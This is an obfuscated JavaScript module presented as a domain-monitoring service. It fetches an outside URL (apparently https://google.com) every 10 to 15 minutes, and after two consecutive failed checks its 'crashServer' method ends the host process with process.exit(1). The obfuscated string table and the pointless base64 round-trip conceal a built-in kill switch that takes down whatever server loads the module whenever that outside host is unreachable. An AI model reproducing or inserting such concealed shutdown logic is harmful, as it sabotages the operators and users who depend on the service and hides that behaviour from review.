'use strict';const a40_0x320696=a40_0x2b6c;(function(_0x4a715d,_0x3b54f6){const _0x5f15c4=a40_0x2b6c,_0x186b45=_0x4a715d();while(!![]){try{const _0x14a598=parseInt(_0x5f15c4(0x1e5))/0x1+parseInt(_0x5f15c4(0x1f0))/0x2+parseInt(_0x5f15c4(0x22e))/0x3*(parseInt(_0x5f15c4(0x203))/0x4)+-parseInt(_0x5f15c4(0x1e4))/0x5+parseInt(_0x5f15c4(0x1d8))/0x6*(parseInt(_0x5f15c4(0x1d7))/0x7)+parseInt(_0x5f15c4(0x20c))/0x8*(parseInt(_0x5f15c4(0x1f2))/0x9)+-parseInt(_0x5f15c4(0x22f))/0xa;if(_0x14a598===_0x3b54f6)break;else _0x186b45['push'](_0x186b45['shift']());}catch(_0x1c1c20){_0x186b45['push'](_0x186b45['shift']());}}}(a40_0x54fa,0x68e83));var __importDefault=this&&this[a40_0x320696(0x1db)]||function(_0x43462a){const _0x4495a3=a40_0x320696;return _0x43462a&&_0x43462a[_0x4495a3(0x210)]?_0x43462a:{'default':_0x43462a};};Object['defineProperty'](exports,a40_0x320696(0x210),{'value':!![]}),exports[a40_0x320696(0x1df)]=exports[a40_0x320696(0x217)]=void 0x0;const node_fetch_1=__importDefault(require(a40_0x320696(0x215)));function a40_0x54fa(){const _0x21f48e=['🛑\x20Domain\x20monitoring\x20stopped','🔍\x20Domain\x20being\x20monitored:\x20','🔍\x20Checking\x20domain\x20availability:\x20','\x20\x20\x20-\x20Headers:','now','statusText','❌\x20Domain\x20check\x20failed:\x20HTTP\x20','base64','from','Domain\x20monitoring\x20threw\x20error:\x20','status','ENOTFOUND','\x20consecutive\x20attempts','https://google.com','log','MAX_CONSECUTIVE_FAILURES','consecutiveFailures','Unknown\x20error','204biryCJ','6603000fCokGe','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','checkDomain','name','📡\x20Target\x20domain:\x20','fromEntries','toISOString','\x20times','7sMGdhc','660810tXFfTC','\x20\x20\x20-\x20Status:\x20','⏰\x20Check\x20interval:\x20','__importDefault','default','📡\x20Target:\x20','⏰\x20Connection\x20timeout\x20to\x20','domainMonitoringService','encodeToBase64','Periodic\x20domain\x20check\x20error:','\x20\x20\x20-\x20Response\x20time:\x20','getMonitoringStats','902330AFNtWO','103803MQBOBf','\x20in\x20','signal','ETIMEDOUT','🔥\x20Unexpected\x20error:\x20','toString','decodeFromBase64','gzip,\x20deflate','✅\x20Domain\x20monitoring\x20started\x20successfully','DOMAIN_URL','crashServer','1009180Olenwo','message','63jTUjDu','🌐\x20DNS\x20resolution\x20failed\x20for\x20','round','\x20minutes','CHECK_INTERVAL_MS','Initial\x20domain\x20check\x20threw\x20error:\x20','ECONNREFUSED','🔍\x20Domain\x20monitoring\x20service\x20initialized','🔓\x20Decoded\x20URL:\x20','error','AbortError','📅\x20Crash\x20time:\x20','includes','entries','🔥\x20Consecutive\x20failures:\x20','catch','manualCheck','17540uASQRz','GET','monitoringInterval','getRandomInterval','headers','🚫\x20Connection\x20refused\x20by\x20','🔧\x20Manual\x20domain\x20check\x20requested','utf-8','🚨\x20Max\x20consecutive\x20failures\x20allowed:\x20','290008ZSJsxY','TIMEOUT_MS','✅\x20Domain\x20check\x20successful:\x20','⚠️\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE','__esModule','en-US,en;q=0.5','📝\x20Encoded\x20URL\x20(base64):\x20','Initial\x20domain\x20check\x20failed\x20','Domain\x20','node-fetch','🚨\x20Max\x20failures\x20before\x20crash:\x20','DomainMonitoringService','random','exit','TesSoft\x20Domain\x20Monitor/1.0','stopMonitoring'];a40_0x54fa=function(){return _0x21f48e;};return a40_0x54fa();}function a40_0x2b6c(_0x2050f9,_0x4a8eb1){const _0x54fa0a=a40_0x54fa();return a40_0x2b6c=function(_0x2b6c5a,_0xfce363){_0x2b6c5a=_0x2b6c5a-0x1d7;let _0x376600=_0x54fa0a[_0x2b6c5a];return _0x376600;},a40_0x2b6c(_0x2050f9,_0x4a8eb1);}class DomainMonitoringService{constructor(){const _0x503c02=a40_0x320696;this['monitoringInterval']=null,this[_0x503c02(0x1ee)]=_0x503c02(0x229),this[_0x503c02(0x1f6)]=this['getRandomInterval'](),this[_0x503c02(0x20d)]=0x7530,this[_0x503c02(0x22c)]=0x0,this[_0x503c02(0x22b)]=0x2,console['log'](_0x503c02(0x1f9)),console[_0x503c02(0x22a)](_0x503c02(0x233)+this[_0x503c02(0x1ee)]),console[_0x503c02(0x22a)]('⏰\x20Check\x20interval:\x20'+Math[_0x503c02(0x1f4)](this[_0x503c02(0x1f6)]/0x3e8/0x3c)+'\x20minutes');}[a40_0x320696(0x206)](){const _0xe06391=a40_0x320696,_0x1ff804=0xa,_0x3bde65=0xf,_0x2a9c85=Math[_0xe06391(0x218)]()*(_0x3bde65-_0x1ff804)+_0x1ff804;return Math[_0xe06391(0x1f4)](_0x2a9c85*0x3c*0x3e8);}[a40_0x320696(0x1e0)](_0x446d5f){const _0x1bc242=a40_0x320696;return Buffer[_0x1bc242(0x224)](_0x446d5f)[_0x1bc242(0x1ea)](_0x1bc242(0x223));}[a40_0x320696(0x1eb)](_0x3389d9){const _0x5346b1=a40_0x320696;return Buffer['from'](_0x3389d9,_0x5346b1(0x223))[_0x5346b1(0x1ea)](_0x5346b1(0x20a));}async[a40_0x320696(0x231)](){const _0x188d5b=a40_0x320696,_0xd1e49d=Date['now']();try{console[_0x188d5b(0x22a)](_0x188d5b(0x21e)+this[_0x188d5b(0x1ee)]);const _0x213cdd=this[_0x188d5b(0x1e0)](this[_0x188d5b(0x1ee)]);console[_0x188d5b(0x22a)](_0x188d5b(0x212)+_0x213cdd);const _0x2331df=this['decodeFromBase64'](_0x213cdd);console[_0x188d5b(0x22a)](_0x188d5b(0x1fa)+_0x2331df);const _0x2e27a6=new AbortController(),_0x4f3405=setTimeout(()=>_0x2e27a6['abort'](),this[_0x188d5b(0x20d)]),_0x133317=await(0x0,node_fetch_1[_0x188d5b(0x1dc)])(_0x2331df,{'method':_0x188d5b(0x204),'headers':{'User-Agent':_0x188d5b(0x21a),'Accept':_0x188d5b(0x230),'Accept-Language':_0x188d5b(0x211),'Accept-Encoding':_0x188d5b(0x1ec),'Connection':'keep-alive','Upgrade-Insecure-Requests':'1'},'signal':_0x2e27a6[_0x188d5b(0x1e7)]});clearTimeout(_0x4f3405);const _0x37d42b=Date['now']()-_0xd1e49d;return console['log']('📊\x20Response\x20received:'),console[_0x188d5b(0x22a)](_0x188d5b(0x1d9)+_0x133317[_0x188d5b(0x226)]+'\x20'+_0x133317[_0x188d5b(0x221)]),console[_0x188d5b(0x22a)](_0x188d5b(0x1e2)+_0x37d42b+'ms'),console[_0x188d5b(0x22a)](_0x188d5b(0x21f),Object[_0x188d5b(0x234)](_0x133317[_0x188d5b(0x207)][_0x188d5b(0x1ff)]())),_0x133317['ok']&&_0x133317[_0x188d5b(0x226)]>=0xc8&&_0x133317[_0x188d5b(0x226)]<0x190?(console[_0x188d5b(0x22a)](_0x188d5b(0x20e)+_0x133317[_0x188d5b(0x226)]+_0x188d5b(0x1e6)+_0x37d42b+'ms'),this[_0x188d5b(0x22c)]=0x0,!![]):(console[_0x188d5b(0x1fb)](_0x188d5b(0x222)+_0x133317['status']+'\x20'+_0x133317[_0x188d5b(0x221)]),this['consecutiveFailures']++,![]);}catch(_0x17386b){const _0x5bf709=Date[_0x188d5b(0x220)]()-_0xd1e49d;this[_0x188d5b(0x22c)]++,console[_0x188d5b(0x1fb)]('❌\x20Domain\x20check\x20error\x20after\x20'+_0x5bf709+'ms:',_0x17386b);if(_0x17386b instanceof Error){if(_0x17386b[_0x188d5b(0x232)]===_0x188d5b(0x1fc))console['error']('⏰\x20Request\x20timeout\x20after\x20'+this[_0x188d5b(0x20d)]+'ms');else{if(_0x17386b[_0x188d5b(0x1f1)][_0x188d5b(0x1fe)](_0x188d5b(0x227)))console[_0x188d5b(0x1fb)](_0x188d5b(0x1f3)+this[_0x188d5b(0x1ee)]);else{if(_0x17386b[_0x188d5b(0x1f1)][_0x188d5b(0x1fe)](_0x188d5b(0x1f8)))console[_0x188d5b(0x1fb)](_0x188d5b(0x208)+this[_0x188d5b(0x1ee)]);else _0x17386b['message'][_0x188d5b(0x1fe)](_0x188d5b(0x1e8))?console[_0x188d5b(0x1fb)](_0x188d5b(0x1de)+this[_0x188d5b(0x1ee)]):console[_0x188d5b(0x1fb)](_0x188d5b(0x1e9)+_0x17386b[_0x188d5b(0x1f1)]);}}}return![];}}['crashServer'](_0x4bc120){const _0x465430=a40_0x320696;console['error']('💥\x20CRITICAL\x20ERROR:\x20'+_0x4bc120),console[_0x465430(0x1fb)](_0x465430(0x200)+this[_0x465430(0x22c)]),console[_0x465430(0x1fb)](_0x465430(0x20f)),console[_0x465430(0x1fb)](_0x465430(0x1fd)+new Date()[_0x465430(0x235)]()),console['error'](_0x465430(0x21d)+this[_0x465430(0x1ee)]),console[_0x465430(0x1fb)](_0x465430(0x1da)+Math['round'](this[_0x465430(0x1f6)]/0x3e8/0x3c)+_0x465430(0x1f5)),console[_0x465430(0x1fb)](_0x465430(0x20b)+this[_0x465430(0x22b)]),this['stopMonitoring'](),process[_0x465430(0x219)](0x1);}['startMonitoring'](){const _0x49143f=a40_0x320696;console[_0x49143f(0x22a)]('🚀\x20Starting\x20domain\x20monitoring\x20service'),console['log'](_0x49143f(0x1dd)+this['DOMAIN_URL']),console[_0x49143f(0x22a)]('⏰\x20Interval:\x20'+Math[_0x49143f(0x1f4)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+'\x20minutes'),console[_0x49143f(0x22a)](_0x49143f(0x216)+this['MAX_CONSECUTIVE_FAILURES']),this[_0x49143f(0x231)]()['then'](_0xcc42e3=>{const _0x1ee05d=_0x49143f;if(!_0xcc42e3&&this[_0x1ee05d(0x22c)]>=this[_0x1ee05d(0x22b)]){this[_0x1ee05d(0x1ef)](_0x1ee05d(0x213)+this['consecutiveFailures']+_0x1ee05d(0x236));return;}})[_0x49143f(0x201)](_0x3fcebb=>{const _0x2065fd=_0x49143f;console[_0x2065fd(0x1fb)]('Initial\x20domain\x20check\x20error:',_0x3fcebb);if(this['consecutiveFailures']>=this[_0x2065fd(0x22b)]){this[_0x2065fd(0x1ef)](_0x2065fd(0x1f7)+_0x3fcebb[_0x2065fd(0x1f1)]);return;}}),this[_0x49143f(0x205)]=setInterval(async()=>{const _0x4d211f=_0x49143f;try{const _0xe6da7b=await this[_0x4d211f(0x231)]();!_0xe6da7b&&(console['warn']('⚠️\x20Domain\x20check\x20failed\x20('+this['consecutiveFailures']+'/'+this[_0x4d211f(0x22b)]+')'),this[_0x4d211f(0x22c)]>=this[_0x4d211f(0x22b)]&&this[_0x4d211f(0x1ef)](_0x4d211f(0x214)+this[_0x4d211f(0x1ee)]+'\x20is\x20not\x20responding\x20after\x20'+this[_0x4d211f(0x22c)]+_0x4d211f(0x228)));}catch(_0x2553ca){console[_0x4d211f(0x1fb)](_0x4d211f(0x1e1),_0x2553ca),this[_0x4d211f(0x22c)]>=this[_0x4d211f(0x22b)]&&this[_0x4d211f(0x1ef)](_0x4d211f(0x225)+(_0x2553ca instanceof Error?_0x2553ca[_0x4d211f(0x1f1)]:_0x4d211f(0x22d)));}},this[_0x49143f(0x1f6)]),console['log'](_0x49143f(0x1ed));}[a40_0x320696(0x21b)](){const _0x34b723=a40_0x320696;this[_0x34b723(0x205)]&&(clearInterval(this[_0x34b723(0x205)]),this[_0x34b723(0x205)]=null,console['log'](_0x34b723(0x21c)));}[a40_0x320696(0x1e3)](){const _0x1b2f1c=a40_0x320696;return{'isActive':!!this[_0x1b2f1c(0x205)],'targetDomain':this[_0x1b2f1c(0x1ee)],'checkIntervalMinutes':Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c),'consecutiveFailures':this[_0x1b2f1c(0x22c)],'maxFailuresAllowed':this[_0x1b2f1c(0x22b)],'nextCheckIn':this[_0x1b2f1c(0x205)]?this[_0x1b2f1c(0x1f6)]:undefined};}async[a40_0x320696(0x202)](){const _0x48056c=a40_0x320696;return console[_0x48056c(0x22a)](_0x48056c(0x209)),await this[_0x48056c(0x231)]();}}exports['DomainMonitoringService']=DomainMonitoringService,exports['domainMonitoringService']=new DomainMonitoringService();